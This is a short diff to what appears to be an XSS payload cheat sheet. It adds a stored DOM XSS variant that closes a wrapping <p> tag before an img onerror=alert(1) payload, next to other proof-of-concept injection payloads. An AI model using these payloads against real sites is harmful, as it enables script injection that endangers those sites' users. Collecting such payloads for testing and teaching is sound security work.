@@ -231,6 +231,11 @@ document.getElementById("greeting").textContent = "Hello, " + escapedName;
 <img src=x onerror=alert(1) />
 ```
 
+Stored DOM variant where client-side JS wraps the comment body in a `<p>` element before writing it to `innerHTML`, break out of the wrapper:
+```html
+</p><img src=x onerror=alert(1) /><p></p>
+```
+
 ## DOM XSS inside `<select>` / `document.write` with option context
 
 Escape the option element then inject:
